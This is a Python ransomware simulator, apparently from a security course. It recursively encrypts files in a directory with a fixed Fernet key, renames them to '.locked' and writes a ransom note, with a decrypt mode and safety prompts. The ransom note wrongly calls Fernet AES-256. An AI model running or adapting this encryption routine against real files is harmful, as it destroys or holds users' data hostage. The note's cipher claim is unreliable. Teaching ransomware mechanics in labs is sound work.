#!/usr/bin/env python3
"""
Ransomware Simulator Generator - Group 3
Educational tool for understanding ransomware mechanics in a safe lab environment.
WARNING: This tool is for EDUCATIONAL PURPOSES ONLY and should only be used 
in isolated lab environments or virtual machines.
"""

import os
import sys
import time
import json
import logging
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
import argparse

class RansomwareSimulator:
    def __init__(self, target_directory=None):
        """Initialize the ransomware simulator with security checks."""
        self.target_directory = target_directory
        self.locked_extension = ".locked"
        self.ransom_note_filename = "README_RANSOM.txt"
        self.log_filename = "ransomware_simulation.log"
        self.encryption_key = self._generate_fixed_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.processed_files = []
        
        # Setup logging
        self._setup_logging()
        
        # Safety checks
        self._perform_safety_checks()
    
    def _generate_fixed_key(self):
        """Generate a fixed encryption key for educational purposes."""
        # Using a fixed key for educational simulation - DO NOT use in real scenarios
        return b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
    
    def _setup_logging(self):
        """Setup logging configuration."""
        log_path = Path(self.log_filename)
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_path),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def _perform_safety_checks(self):
        """Perform safety checks before execution."""
        # Check if running in a potentially unsafe environment
        dangerous_paths = [
            'C:\\Windows',
            'C:\\Program Files',
            'C:\\Program Files (x86)',
            '/usr',
            '/bin',
            '/sbin',
            '/etc',
            '/var',
            '/home'
        ]
        
        if self.target_directory:
            target_path = Path(self.target_directory).resolve()
            for dangerous_path in dangerous_paths:
                if str(target_path).startswith(dangerous_path):
                    raise ValueError(f"SAFETY ERROR: Cannot target system directory {dangerous_path}")
    
    def display_warning(self):
        """Display educational warning message."""
        warning_message = """
╔═══════════════════════════════════════════════════════════════════╗
║                        ⚠️  WARNING ⚠️                              ║
║                                                                   ║
║  RANSOMWARE SIMULATOR - EDUCATIONAL PURPOSE ONLY                 ║
║                                                                   ║
║  This tool is designed for educational use in controlled lab      ║
║  environments only. It simulates ransomware behavior to help      ║
║  understand cybersecurity threats and recovery techniques.        ║
║                                                                   ║
║  🚫 DO NOT USE ON PRODUCTION SYSTEMS                              ║
║  🚫 DO NOT USE ON PERSONAL COMPUTERS                              ║
║  ✅ USE ONLY IN ISOLATED LAB ENVIRONMENTS                         ║
║  ✅ USE ONLY IN VIRTUAL MACHINES                                  ║
║                                                                   ║
║  By proceeding, you acknowledge that you understand this is       ║
║  for educational purposes only and accept full responsibility.    ║
╚═══════════════════════════════════════════════════════════════════╝
        """
        print(warning_message)
        
        # Additional confirmation
        confirmation = input("\nDo you understand and agree to these terms? (type 'YES' to continue): ")
        if confirmation.upper() != "YES":
            print("Operation cancelled for safety.")
            sys.exit(0)
        
        # Secondary confirmation with target directory
        if self.target_directory:
            print(f"\nTarget directory: {self.target_directory}")
            final_confirm = input("Are you sure you want to proceed with this directory? (type 'CONFIRM'): ")
            if final_confirm.upper() != "CONFIRM":
                print("Operation cancelled.")
                sys.exit(0)
    
    def scan_directory(self, directory_path):
        """Recursively scan directory for files to process."""
        files_to_process = []
        try:
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    file_path = Path(root) / file
                    
                    # Skip already locked files
                    if file.endswith(self.locked_extension):
                        continue
                    
                    # Skip system files and our own files
                    if file in [self.ransom_note_filename, self.log_filename]:
                        continue
                    
                    # Skip files that might be in use or protected
                    try:
                        # Test if file is accessible
                        with open(file_path, 'rb') as f:
                            pass
                        files_to_process.append(file_path)
                    except (PermissionError, OSError) as e:
                        self.logger.warning(f"Skipping protected file: {file_path} - {e}")
                        
        except Exception as e:
            self.logger.error(f"Error scanning directory {directory_path}: {e}")
        
        return files_to_process
    
    def encrypt_file_content(self, file_path):
        """Encrypt file content using Fernet encryption."""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher_suite.encrypt(file_data)
            
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            
            return True
        except Exception as e:
            self.logger.error(f"Failed to encrypt content of {file_path}: {e}")
            return False
    
    def decrypt_file_content(self, file_path):
        """Decrypt file content using Fernet decryption."""
        try:
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            with open(file_path, 'wb') as file:
                file.write(decrypted_data)
            
            return True
        except Exception as e:
            self.logger.error(f"Failed to decrypt content of {file_path}: {e}")
            return False
    
    def simulate_encryption(self, directory_path):
        """Simulate ransomware encryption process."""
        self.logger.info(f"Starting encryption simulation on directory: {directory_path}")
        
        files_to_process = self.scan_directory(directory_path)
        self.logger.info(f"Found {len(files_to_process)} files to process")
        
        encrypted_count = 0
        failed_count = 0
        
        for file_path in files_to_process:
            try:
                # Store original file info
                original_path = str(file_path)
                locked_path = str(file_path) + self.locked_extension
                
                # Encrypt file content
                if self.encrypt_file_content(file_path):
                    # Rename file with .locked extension
                    os.rename(file_path, locked_path)
                    
                    # Log the action
                    file_info = {
                        'action': 'encrypted',
                        'original_path': original_path,
                        'locked_path': locked_path,
                        'timestamp': datetime.now().isoformat()
                    }
                    self.processed_files.append(file_info)
                    
                    self.logger.info(f"Encrypted: {original_path} -> {locked_path}")
                    encrypted_count += 1
                else:
                    failed_count += 1
                    
            except Exception as e:
                self.logger.error(f"Failed to process {file_path}: {e}")
                failed_count += 1
        
        # Generate ransom note
        self.generate_ransom_note(directory_path, encrypted_count)
        
        # Save processed files log
        self.save_processed_files_log()
        
        self.logger.info(f"Encryption simulation completed. Files encrypted: {encrypted_count}, Failed: {failed_count}")
        print(f"\n✅ Encryption simulation completed!")
        print(f"📁 Files encrypted: {encrypted_count}")
        print(f"❌ Files failed: {failed_count}")
        print(f"📝 Check {self.ransom_note_filename} for recovery instructions")
    
    def simulate_decryption(self, directory_path):
        """Simulate ransomware decryption process."""
        self.logger.info(f"Starting decryption simulation on directory: {directory_path}")
        
        # Load processed files log
        self.load_processed_files_log()
        
        decrypted_count = 0
        failed_count = 0
        
        # Find all .locked files
        locked_files = []
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                if file.endswith(self.locked_extension):
                    locked_files.append(Path(root) / file)
        
        for locked_file in locked_files:
            try:
                # Determine original filename
                original_path = str(locked_file).replace(self.locked_extension, '')
                
                # Decrypt file content
                if self.decrypt_file_content(locked_file):
                    # Rename file back to original name
                    os.rename(locked_file, original_path)
                    
                    # Log the action
                    file_info = {
                        'action': 'decrypted',
                        'locked_path': str(locked_file),
                        'original_path': original_path,
                        'timestamp': datetime.now().isoformat()
                    }
                    self.processed_files.append(file_info)
                    
                    self.logger.info(f"Decrypted: {locked_file} -> {original_path}")
                    decrypted_count += 1
                else:
                    failed_count += 1
                    
            except Exception as e:
                self.logger.error(f"Failed to decrypt {locked_file}: {e}")
                failed_count += 1
        
        # Remove ransom note
        ransom_note_path = Path(directory_path) / self.ransom_note_filename
        if ransom_note_path.exists():
            try:
                ransom_note_path.unlink()
                self.logger.info("Removed ransom note")
            except Exception as e:
                self.logger.error(f"Failed to remove ransom note: {e}")
        
        # Save updated log
        self.save_processed_files_log()
        
        self.logger.info(f"Decryption simulation completed. Files decrypted: {decrypted_count}, Failed: {failed_count}")
        print(f"\n✅ Decryption simulation completed!")
        print(f"📁 Files decrypted: {decrypted_count}")
        print(f"❌ Files failed: {failed_count}")
    
    def generate_ransom_note(self, directory_path, encrypted_count):
        """Generate a ransom note explaining the simulation."""
        ransom_note_content = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    🔒 RANSOMWARE SIMULATION 🔒                    ║
║                                                                   ║
║  This is an EDUCATIONAL SIMULATION of ransomware behavior.       ║
║  Your files have been encrypted as part of a cybersecurity       ║
║  learning exercise.                                               ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SIMULATION SUMMARY:
━━━━━━━━━━━━━━━━━━━━━━
• Files encrypted: {encrypted_count}
• Encryption method: AES-256 (Fernet)
• Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔓 RECOVERY INSTRUCTIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━
To restore your files, run the following command in your terminal:

    python testing.py --decrypt "{directory_path}"

OR

    python testing.py -d "{directory_path}"

📚 EDUCATIONAL NOTES:
━━━━━━━━━━━━━━━━━━━━━━━
This simulation demonstrates:
• How ransomware traverses directory structures
• File encryption techniques used by malicious actors
• The impact of ransomware on file systems
• Recovery mechanisms and their importance

🛡️ PREVENTION STRATEGIES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Regular backups (3-2-1 rule)
• Keep systems updated
• Use reputable antivirus software
• Educate users about phishing
• Implement network segmentation
• Use application whitelisting

⚠️ REMINDER: This is a SIMULATION for educational purposes only.
In real ransomware attacks, recovery is not guaranteed even with payment.

Generated by: Ransomware Simulator Generator - Group 3
Course: NSSECU02
Purpose: Educational cybersecurity awareness
"""
        
        ransom_note_path = Path(directory_path) / self.ransom_note_filename
        try:
            with open(ransom_note_path, 'w', encoding='utf-8') as f:
                f.write(ransom_note_content)
            self.logger.info(f"Generated ransom note: {ransom_note_path}")
        except Exception as e:
            self.logger.error(f"Failed to generate ransom note: {e}")
    
    def save_processed_files_log(self):
        """Save the log of processed files."""
        log_data = {
            'simulation_info': {
                'tool_name': 'Ransomware Simulator Generator - Group 3',
                'course': 'NSSECU02',
                'timestamp': datetime.now().isoformat(),
                'encryption_key': self.encryption_key.decode('utf-8')
            },
            'processed_files': self.processed_files
        }
        
        try:
            with open('processed_files.json', 'w') as f:
                json.dump(log_data, f, indent=2)
            self.logger.info("Saved processed files log")
        except Exception as e:
            self.logger.error(f"Failed to save processed files log: {e}")
    
    def load_processed_files_log(self):
        """Load the log of processed files."""
        try:
            if os.path.exists('processed_files.json'):
                with open('processed_files.json', 'r') as f:
                    log_data = json.load(f)
                    self.processed_files = log_data.get('processed_files', [])
                    self.logger.info("Loaded processed files log")
        except Exception as e:
            self.logger.error(f"Failed to load processed files log: {e}")
            self.processed_files = []

def main():
    """Main function to handle command line arguments and execute the simulator."""
    parser = argparse.ArgumentParser(
        description="Ransomware Simulator Generator - Educational Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python testing.py --encrypt C:\\temp\\test_folder
  python testing.py --decrypt C:\\temp\\test_folder
  python testing.py -e ./test_directory
  python testing.py -d ./test_directory

Warning: Use only in controlled lab environments!
        """
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '-e', '--encrypt',
        metavar='DIRECTORY',
        help='Simulate encryption on the specified directory'
    )
    group.add_argument(
        '-d', '--decrypt',
        metavar='DIRECTORY',
        help='Simulate decryption on the specified directory'
    )
    
    args = parser.parse_args()
    
    # Determine target directory and mode
    if args.encrypt:
        target_directory = args.encrypt
        mode = 'encrypt'
    else:
        target_directory = args.decrypt
        mode = 'decrypt'
    
    # Validate directory exists
    if not os.path.exists(target_directory):
        print(f"❌ Error: Directory '{target_directory}' does not exist.")
        sys.exit(1)
    
    if not os.path.isdir(target_directory):
        print(f"❌ Error: '{target_directory}' is not a directory.")
        sys.exit(1)
    
    try:
        # Initialize simulator
        simulator = RansomwareSimulator(target_directory)
        
        # Display warning (required for both encryption and decryption)
        simulator.display_warning()
        
        # Execute the appropriate operation
        if mode == 'encrypt':
            print(f"\n🔒 Starting encryption simulation...")
            simulator.simulate_encryption(target_directory)
        else:
            print(f"\n🔓 Starting decryption simulation...")
            simulator.simulate_decryption(target_directory)
            
    except ValueError as e:
        print(f"❌ Safety Error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n\n❌ Operation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()